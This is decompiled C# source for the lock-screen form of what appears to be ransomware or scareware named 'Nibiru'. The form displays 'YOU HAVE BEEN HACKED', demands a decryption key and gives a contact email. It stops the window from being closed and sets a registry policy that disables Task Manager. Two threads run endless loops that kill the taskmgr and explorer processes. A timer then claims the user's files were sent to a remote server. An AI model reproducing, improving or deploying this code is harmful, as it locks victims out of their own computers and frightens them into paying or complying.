using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Nibiru.My;
using Nibiru.My.Resources;

namespace Nibiru;

[DesignerGenerated]
public class Form2 : Form
{
	private IContainer components;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("Panel7")]
	private Panel _Panel7;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("Label6")]
	private Label _Label6;

	[AccessedThroughProperty("Label7")]
	private Label _Label7;

	[AccessedThroughProperty("Button3")]
	private Button _Button3;

	[AccessedThroughProperty("ProgressBar2")]
	private ProgressBar _ProgressBar2;

	[AccessedThroughProperty("Label8")]
	private Label _Label8;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label3
	{
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual Label Label4
	{
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = TextBox1_TextChanged;
			if (_TextBox1 != null)
			{
				((Control)_TextBox1).remove_TextChanged(eventHandler);
			}
			_TextBox1 = value;
			if (_TextBox1 != null)
			{
				((Control)_TextBox1).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual Label Label5
	{
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual Panel Panel7
	{
		get
		{
			return _Panel7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Panel7 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = ProgressBar1_Click;
			if (_ProgressBar1 != null)
			{
				((Control)_ProgressBar1).remove_Click(eventHandler);
			}
			_ProgressBar1 = value;
			if (_ProgressBar1 != null)
			{
				((Control)_ProgressBar1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button2_Click;
			if (_Button2 != null)
			{
				((Control)_Button2).remove_Click(eventHandler);
			}
			_Button2 = value;
			if (_Button2 != null)
			{
				((Control)_Button2).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label6
	{
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label6 = value;
		}
	}

	internal virtual Label Label7
	{
		get
		{
			return _Label7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label7 = value;
		}
	}

	internal virtual Button Button3
	{
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button3_Click;
			if (_Button3 != null)
			{
				((Control)_Button3).remove_Click(eventHandler);
			}
			_Button3 = value;
			if (_Button3 != null)
			{
				((Control)_Button3).add_Click(eventHandler);
			}
		}
	}

	internal virtual ProgressBar ProgressBar2
	{
		get
		{
			return _ProgressBar2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar2 = value;
		}
	}

	internal virtual Label Label8
	{
		get
		{
			return _Label8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label8 = value;
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	public Form2()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form2_FormClosing));
		((Form)this).add_Load((EventHandler)Form2_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_0102: Unknown result type (might be due to invalid IL or missing references)
		//IL_0188: Unknown result type (might be due to invalid IL or missing references)
		//IL_0192: Expected O, but got Unknown
		//IL_01d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_026f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0314: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0418: Unknown result type (might be due to invalid IL or missing references)
		//IL_0481: Unknown result type (might be due to invalid IL or missing references)
		//IL_048b: Expected O, but got Unknown
		//IL_04b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_052f: Unknown result type (might be due to invalid IL or missing references)
		//IL_059b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a28: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a32: Expected O, but got Unknown
		//IL_0a46: Unknown result type (might be due to invalid IL or missing references)
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form2));
		Button1 = new Button();
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		Label4 = new Label();
		TextBox1 = new TextBox();
		Label5 = new Label();
		Panel7 = new Panel();
		ProgressBar1 = new ProgressBar();
		Button2 = new Button();
		Label6 = new Label();
		Label7 = new Label();
		Button3 = new Button();
		ProgressBar2 = new ProgressBar();
		Label8 = new Label();
		Timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		Button button = Button1;
		Point location = new Point(865, 689);
		((Control)button).set_Location(location);
		Button button2 = Button1;
		Padding margin = default(Padding);
		((Padding)(ref margin))._002Ector(5);
		((Control)button2).set_Margin(margin);
		((Control)Button1).set_Name("Button1");
		Button button3 = Button1;
		Size size = new Size(125, 54);
		((Control)button3).set_Size(size);
		((Control)Button1).set_TabIndex(0);
		((ButtonBase)Button1).set_Text("DECRYPT YOUR FILES");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.Black);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.FromArgb(192, 0, 0));
		Label label = Label1;
		location = new Point(356, -2);
		((Control)label).set_Location(location);
		Label label2 = Label1;
		((Padding)(ref margin))._002Ector(5, 0, 5, 0);
		((Control)label2).set_Margin(margin);
		((Control)Label1).set_Name("Label1");
		Label label3 = Label1;
		size = new Size(509, 42);
		((Control)label3).set_Size(size);
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("YOU HAVE BEEN HACKED");
		Label2.set_AutoSize(true);
		((Control)Label2).set_BackColor(Color.FromArgb(192, 0, 0));
		Label label4 = Label2;
		location = new Point(3, 208);
		((Control)label4).set_Location(location);
		Label label5 = Label2;
		((Padding)(ref margin))._002Ector(5, 0, 5, 0);
		((Control)label5).set_Margin(margin);
		((Control)Label2).set_Name("Label2");
		Label label6 = Label2;
		size = new Size(595, 120);
		((Control)label6).set_Size(size);
		((Control)Label2).set_TabIndex(2);
		Label2.set_Text(componentResourceManager.GetString("Label2.Text"));
		Label3.set_AutoSize(true);
		((Control)Label3).set_BackColor(Color.FromArgb(192, 0, 0));
		Label label7 = Label3;
		location = new Point(648, 208);
		((Control)label7).set_Location(location);
		Label label8 = Label3;
		((Padding)(ref margin))._002Ector(5, 0, 5, 0);
		((Control)label8).set_Margin(margin);
		((Control)Label3).set_Name("Label3");
		Label label9 = Label3;
		size = new Size(556, 120);
		((Control)label9).set_Size(size);
		((Control)Label3).set_TabIndex(3);
		Label3.set_Text(componentResourceManager.GetString("Label3.Text"));
		Label4.set_AutoSize(true);
		Label label10 = Label4;
		location = new Point(1360, 457);
		((Control)label10).set_Location(location);
		Label label11 = Label4;
		((Padding)(ref margin))._002Ector(5, 0, 5, 0);
		((Control)label11).set_Margin(margin);
		((Control)Label4).set_Name("Label4");
		Label label12 = Label4;
		size = new Size(63, 20);
		((Control)label12).set_Size(size);
		((Control)Label4).set_TabIndex(4);
		Label4.set_Text("Label4");
		TextBox textBox = TextBox1;
		location = new Point(363, 703);
		((Control)textBox).set_Location(location);
		TextBox textBox2 = TextBox1;
		((Padding)(ref margin))._002Ector(5);
		((Control)textBox2).set_Margin(margin);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox3 = TextBox1;
		size = new Size(470, 27);
		((Control)textBox3).set_Size(size);
		((Control)TextBox1).set_TabIndex(5);
		Label5.set_AutoSize(true);
		((Control)Label5).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Label label13 = Label5;
		location = new Point(185, 703);
		((Control)label13).set_Location(location);
		Label label14 = Label5;
		((Padding)(ref margin))._002Ector(5, 0, 5, 0);
		((Control)label14).set_Margin(margin);
		((Control)Label5).set_Name("Label5");
		Label label15 = Label5;
		size = new Size(151, 24);
		((Control)label15).set_Size(size);
		((Control)Label5).set_TabIndex(7);
		Label5.set_Text("Enter Your Key");
		Panel panel = Panel7;
		location = new Point(1325, 63);
		((Control)panel).set_Location(location);
		Panel panel2 = Panel7;
		((Padding)(ref margin))._002Ector(5);
		((Control)panel2).set_Margin(margin);
		((Control)Panel7).set_Name("Panel7");
		Panel panel3 = Panel7;
		size = new Size(333, 154);
		((Control)panel3).set_Size(size);
		((Control)Panel7).set_TabIndex(0);
		ProgressBar progressBar = ProgressBar1;
		location = new Point(198, 915);
		((Control)progressBar).set_Location(location);
		ProgressBar progressBar2 = ProgressBar1;
		((Padding)(ref margin))._002Ector(5);
		((Control)progressBar2).set_Margin(margin);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar3 = ProgressBar1;
		size = new Size(1380, 62);
		((Control)progressBar3).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(9);
		((ButtonBase)Button2).set_BackColor(Color.FromArgb(192, 0, 0));
		Button button4 = Button2;
		location = new Point(29, 404);
		((Control)button4).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button5 = Button2;
		size = new Size(307, 52);
		((Control)button5).set_Size(size);
		((Control)Button2).set_TabIndex(10);
		((ButtonBase)Button2).set_Text("Click to Hide  Details");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(false);
		Label6.set_AutoSize(true);
		Label label16 = Label6;
		location = new Point(3, 459);
		((Control)label16).set_Location(location);
		((Control)Label6).set_Name("Label6");
		Label label17 = Label6;
		size = new Size(400, 180);
		((Control)label17).set_Size(size);
		((Control)Label6).set_TabIndex(11);
		Label6.set_Text(componentResourceManager.GetString("Label6.Text"));
		Label7.set_AutoSize(true);
		Label label18 = Label7;
		location = new Point(861, 459);
		((Control)label18).set_Location(location);
		((Control)Label7).set_Name("Label7");
		Label label19 = Label7;
		size = new Size(379, 220);
		((Control)label19).set_Size(size);
		((Control)Label7).set_TabIndex(12);
		Label7.set_Text(componentResourceManager.GetString("Label7.Text"));
		((ButtonBase)Button3).set_BackColor(Color.FromArgb(192, 0, 0));
		Button button6 = Button3;
		location = new Point(907, 404);
		((Control)button6).set_Location(location);
		((Control)Button3).set_Name("Button3");
		Button button7 = Button3;
		size = new Size(281, 47);
		((Control)button7).set_Size(size);
		((Control)Button3).set_TabIndex(13);
		((ButtonBase)Button3).set_Text("Click To View Content");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(false);
		((Control)ProgressBar2).set_BackColor(Color.Silver);
		ProgressBar progressBar4 = ProgressBar2;
		location = new Point(250, 751);
		((Control)progressBar4).set_Location(location);
		((Control)ProgressBar2).set_Name("ProgressBar2");
		ProgressBar progressBar5 = ProgressBar2;
		size = new Size(634, 30);
		((Control)progressBar5).set_Size(size);
		((Control)ProgressBar2).set_TabIndex(14);
		Label8.set_AutoSize(true);
		((Control)Label8).set_BackColor(Color.FromArgb(192, 0, 0));
		Label label20 = Label8;
		location = new Point(483, 579);
		((Control)label20).set_Location(location);
		((Control)Label8).set_Name("Label8");
		Label label21 = Label8;
		size = new Size(231, 20);
		((Control)label21).set_Size(size);
		((Control)Label8).set_TabIndex(15);
		Label8.set_Text("Cyberwars@protonmail.com");
		Timer1.set_Enabled(true);
		SizeF autoScaleDimensions = new SizeF(10f, 20f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)(object)Resources.hacker2);
		size = new Size(1284, 782);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)Label8);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar2);
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)Label7);
		((Control)this).get_Controls().Add((Control)(object)Label6);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)Panel7);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)this).set_ForeColor(SystemColors.Desktop);
		((Padding)(ref margin))._002Ector(5);
		((Form)this).set_Margin(margin);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form2");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form2");
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form2_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		if ((int)e.get_CloseReason() == 3)
		{
			((CancelEventArgs)(object)e).Cancel = true;
			MessageBox.Show("Closing of this Malware is not allowed", "Security", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		Thread thread = new Thread(block);
		thread.Start();
		Thread thread2 = new Thread(block2);
		thread2.Start();
		string value = "1";
		string subkey = "Software\\microsoft\\Windows\\currentversion\\Policies\\System";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey);
			registryKey.SetValue("Disable Taskmgr", value);
			registryKey.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(TextBox1.get_Text(), " ", false) == 0)
		{
			((Control)this).Hide();
			string value = "0";
			string subkey = "Software\\microsoft\\Windows\\currentversion\\Policies\\System";
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey);
				registryKey.SetValue("Disable Taskmgr", value);
				registryKey.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			((Control)MyProject.Forms.Form3).Show();
		}
		else
		{
			TextBox1.set_Text("WRONG KEY");
		}
	}

	private void ProgressBar1_Click(object sender, EventArgs e)
	{
	}

	public void block2()
	{
		while (true)
		{
			Process[] processesByName = Process.GetProcessesByName("explorer");
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
			Thread.Sleep(100);
		}
	}

	public void block()
	{
		while (true)
		{
			Process[] processesByName = Process.GetProcessesByName("taskmgr");
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
			Thread.Sleep(100);
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		if (!((Control)Label6).get_Visible())
		{
			((Control)Label6).set_Visible(true);
			((ButtonBase)Button1).set_Text("Click To Hide Details");
		}
		else
		{
			((Control)Label6).set_Visible(false);
			((ButtonBase)Button1).set_Text("Click To Show Details");
		}
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		if (!((Control)Label7).get_Visible())
		{
			((Control)Label7).set_Visible(true);
			((ButtonBase)Button1).set_Text("Click To Hide Content");
		}
		else
		{
			((Control)Label6).set_Visible(false);
			((ButtonBase)Button1).set_Text("Click To Show Content");
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		ProgressBar1.Increment(1);
		if (ProgressBar1.get_Value() == 100)
		{
			Timer1.set_Enabled(false);
			Interaction.MsgBox((object)"All Your Files Transfered To Hackers Remote Server", (MsgBoxStyle)0, (object)null);
			((Control)ProgressBar1).Hide();
		}
	}

	private void TextBox1_TextChanged(object sender, EventArgs e)
	{
	}
}
